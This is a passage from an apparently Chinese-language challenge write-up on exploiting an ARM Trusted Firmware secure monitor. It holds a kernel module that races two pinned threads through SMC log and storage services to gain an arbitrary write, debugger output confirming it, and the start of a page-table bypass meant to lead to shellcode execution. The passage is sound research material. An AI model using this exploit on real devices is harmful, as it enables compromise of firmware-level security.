        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// call type
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define SMC_TYPE_FAST    1
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SMC_TYPE_YIELD   0
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">// calling convention
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define SMC_64   1
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SMC_32   0
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">// oen
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define OEN_LOG_SVC       7
</span></span></span><span class="line"><span class="cl"><span class="cp">#define OEN_STORAGE_SVC   9
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">// shift and mask
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define FUNCID_TYPE_SHIFT   31
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FUNCID_CC_SHIFT     30
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FUNCID_OEN_SHIFT    24
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FUNCID_NUM_SHIFT    0
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cm">/* SMC FID */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define SMC_FID(type, cc, oen, num) ((type&lt;&lt;FUNCID_TYPE_SHIFT) | (cc&lt;&lt;FUNCID_CC_SHIFT) | \
</span></span></span><span class="line"><span class="cl"><span class="cp">                                     (oen&lt;&lt;FUNCID_OEN_SHIFT) | (num&lt;&lt;FUNCID_NUM_SHIFT))
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">// 0xE0AC120: rt_svc_desc_t &lt;9, 9, 1, aStorageSvc, STORAGE_SVC_init,  STORAGE_SVC_handler&gt; ; &#34;STORAGE_SVC&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define STORAGE_SVC_WR   0xC9000031
</span></span></span><span class="line"><span class="cl"><span class="cp">#define STORAGE_SVC_RD   0xC9000032
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">// 0xE0AC140: rt_svc_desc_t &lt;7, 7, 0, aLogSvc, LOG_SVC_init, LOG_SVC_handler&gt; ; &#34;LOG_SVC&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define LOG_SMC_FID(num)   SMC_FID(SMC_TYPE_YIELD, SMC_64, OEN_LOG_SVC, num)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define LOG_SVC_PLOG_SET   LOG_SMC_FID(2)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define LOG_SVC_PLOG_RD    LOG_SMC_FID(3)</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><h2 id="step1-竞争写plog实现任意地址写">Step1: 竞争写pLog，实现任意地址写<a hidden class="anchor" aria-hidden="true" href="#step1-竞争写plog实现任意地址写">#</a></h2>
<p>参考：<a href="https://lwn.net/Articles/65178/">Kernel threads made easy</a></p>
<p>开启两个kthread并绑定到不同的核上运行：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;linux-6.6/include/linux/arm-smccc.h&#34; //arm_smccc_smc</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;linux-6.6/include/linux/kthread.h&#34; // kthread</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define BL31_NS_MEM       0x423dc0007
</span></span></span><span class="line"><span class="cl"><span class="cp">#define BL31_NS_MEM_SIZE  0x1000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define MAX_SIZE_ADDR     0xE0D70B0
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">ns_mem</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">func1_thread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">arm_smccc_res</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task2</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;func1 is running on CPU %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">smp_processor_id</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nf">kthread_should_stop</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">STORAGE_SVC_WR</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">BL31_NS_MEM</span><span class="o">+</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span> <span class="c1">// 使size大于0x40，不断触发log_err执行
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">a0</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 调用执行成功返回0时表示竞争成功，max_size已被篡改
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Condition successed!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">kthread_stop</span><span class="p">(</span><span class="n">task2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">func2_thread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;func2 is running on CPU %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">smp_processor_id</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nf">kthread_should_stop</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ns_mem</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">MAX_SIZE_ADDR</span><span class="p">;</span> <span class="c1">// 不断修改pLog-&gt;ptr指向max_size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">step1_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Step1: Device opened</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">arm_smccc_res</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task1</span><span class="p">,</span> <span class="o">*</span><span class="n">task2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ns_mem</span> <span class="o">=</span> <span class="nf">phys_to_virt</span><span class="p">(</span><span class="n">BL31_NS_MEM</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">LOG_SVC_PLOG_SET</span><span class="p">,</span> <span class="n">BL31_NS_MEM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;SMC Driver: LOG_SVC_PLOG_SET, res.0 = 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">res</span><span class="p">.</span><span class="n">a0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">task2</span> <span class="o">=</span> <span class="nf">kthread_create</span><span class="p">(</span><span class="n">func2_thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="s">&#34;func2_thread&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">kthread_bind</span><span class="p">(</span><span class="n">task2</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">wake_up_process</span><span class="p">(</span><span class="n">task2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">task1</span> <span class="o">=</span> <span class="nf">kthread_create</span><span class="p">(</span><span class="n">func1_thread</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">task2</span><span class="p">,</span> <span class="s">&#34;func1_thread&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">kthread_bind</span><span class="p">(</span><span class="n">task1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">wake_up_process</span><span class="p">(</span><span class="n">task1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>虚拟机：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mkdir /mnt/shared &amp;&amp; mount -t 9p -o trans=virtio hostshare /mnt/shared</span>
</span></span><span class="line"><span class="cl"><span class="c1"># insmod /mnt/shared/smc_driver.ko</span>
</span></span><span class="line"><span class="cl"><span class="c1"># cat /dev/step1_driver</span>
</span></span><span class="line"><span class="cl">cat: <span class="nb">read</span> error: Invalid argument
</span></span><span class="line"><span class="cl"><span class="c1"># dmesg</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="o">[</span>   16.796970<span class="o">]</span> smc_driver: loading out-of-tree module taints kernel.
</span></span><span class="line"><span class="cl"><span class="o">[</span>   16.802926<span class="o">]</span> SMC Driver: Initializing the driver
</span></span><span class="line"><span class="cl"><span class="o">[</span>   16.804485<span class="o">]</span> SMC Driver: Device created successfully
</span></span><span class="line"><span class="cl"><span class="o">[</span>   25.819992<span class="o">]</span> Step1: Device opened
</span></span><span class="line"><span class="cl"><span class="o">[</span>   25.830324<span class="o">]</span> SMC Driver: LOG_SVC_PLOG_SET, res.0 <span class="o">=</span> 0x423dc008
</span></span><span class="line"><span class="cl"><span class="o">[</span>   25.850199<span class="o">]</span> func2 is running on CPU <span class="m">2</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>   25.853743<span class="o">]</span> func1 is running on CPU <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>   25.856088<span class="o">]</span> Condition successed!
</span></span><span class="line"><span class="cl"><span class="o">[</span>   25.875623<span class="o">]</span> Step1: Device closed</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>调试：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; target remote :1234
</span></span><span class="line"><span class="cl">pwndbg&gt; b *0xE0A5D8C
</span></span><span class="line"><span class="cl">pwndbg&gt; c
</span></span><span class="line"><span class="cl">Continuing.
</span></span><span class="line"><span class="cl"><span class="o">[</span>Switching to Thread 1.2<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Thread <span class="m">2</span> hit Breakpoint 1, 0x000000000e0a5d8c in ?? <span class="o">()</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">pwndbg&gt; x /32xg 0xE0D70B0
</span></span><span class="line"><span class="cl">0xe0d70b0:	0x6f6f7420657a6973	0x0000000a67696220 <span class="c1"># 此时max_size已被修改</span>
</span></span><span class="line"><span class="cl">0xe0d70c0:	0x0000000000000000	0x0000000000000004</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><h2 id="step2-修改页表执行shellcode">Step2: 修改页表，执行shellcode<a hidden class="anchor" aria-hidden="true" href="#step2-修改页表执行shellcode">#</a></h2>
<p>参考<a href="https://blog.impalabs.com/2212_advisory_huawei-secure-monitor.html#double-mapping-the-secure-monitor">Double Mapping the Secure Monitor</a>和ATF源码了解到存在<strong>WXN机制</strong>，<strong>始终将读写的普通内存映射为从不执行</strong>，只有只读内存依靠<code>MT_EXECUTE/MT_EXECUTE_NEVER</code>属性来确定XN位的值。也就是说只要<code>MT_RW</code>被置位则不论<code>MT_EXECUTE_NEVER</code>有没有被置位都不可执行。相关源码如下：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// lib\xlat_tables\xlat_tables_common.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">mmap_desc</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">attr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">addr_pa</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">level</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="n">mem_type</span> <span class="o">=</span> <span class="nf">MT_TYPE</span><span class="p">(</span><span class="n">attr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">mem_type</span> <span class="o">==</span> <span class="n">MT_DEVICE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Always map read-write normal memory as execute-never.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * This library assumes that it is used by software that does
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * not self-modify its code, therefore R/W memory is reserved
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * for data storage, which must not be executable.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Note that setting the XN bit here is for consistency only.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * The function that enables the MMU sets the SCTLR_ELx.WXN bit,
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * which makes any writable memory region to be treated as
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * execute-never, regardless of the value of the XN bit in the
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * translation table.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * For read-only memory, rely on the MT_EXECUTE/MT_EXECUTE_NEVER
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * attribute to figure out the value of the XN bit.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(((</span><span class="n">attr</span> <span class="o">&amp;</span> <span class="n">MT_RW</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0U</span><span class="p">)</span> <span class="o">||</span> <span class="p">((</span><span class="n">attr</span> <span class="o">&amp;</span> <span class="n">MT_EXECUTE_NEVER</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0U</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// MT_RW被置位则不可执行
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">desc</span> <span class="o">|=</span> <span class="n">execute_never_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">debug_print</span><span class="p">((</span><span class="n">mem_type</span> <span class="o">==</span> <span class="n">MT_MEMORY</span><span class="p">)</span> <span class="o">?</span> <span class="s">&#34;MEM&#34;</span> <span class="o">:</span>
</span></span><span class="line"><span class="cl">		<span class="p">((</span><span class="n">mem_type</span> <span class="o">==</span> <span class="n">MT_NON_CACHEABLE</span><span class="p">)</span> <span class="o">?</span> <span class="s">&#34;NC&#34;</span> <span class="o">:</span> <span class="s">&#34;DEV&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="nf">debug_print</span><span class="p">(((</span><span class="n">attr</span> <span class="o">&amp;</span> <span class="n">MT_RW</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0U</span><span class="p">)</span> <span class="o">?</span> <span class="s">&#34;-RW&#34;</span> <span class="o">:</span> <span class="s">&#34;-RO&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">debug_print</span><span class="p">(((</span><span class="n">attr</span> <span class="o">&amp;</span> <span class="n">MT_NS</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0U</span><span class="p">)</span> <span class="o">?</span> <span class="s">&#34;-NS&#34;</span> <span class="o">:</span> <span class="s">&#34;-S&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">debug_print</span><span class="p">(((</span><span class="n">attr</span> <span class="o">&amp;</span> <span class="n">MT_EXECUTE_NEVER</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0U</span><span class="p">)</span> <span class="o">?</span> <span class="s">&#34;-XN&#34;</span> <span class="o">:</span> <span class="s">&#34;-EXEC&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">desc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init_xlation_table</span><span class="p">(</span><span class="kt">uintptr_t</span> <span class="n">base_va</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">table</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">level</span><span class="p">,</span> <span class="kt">uintptr_t</span> <span class="o">*</span><span class="n">max_va</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">max_pa</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">el</span> <span class="o">=</span> <span class="nf">xlat_arch_current_el</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">execute_never_mask</span> <span class="o">=</span> <span class="nf">xlat_arch_get_xn_desc</span><span class="p">(</span><span class="n">el</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="c1">// lib\xlat_tables\aarch64\xlat_tables.c
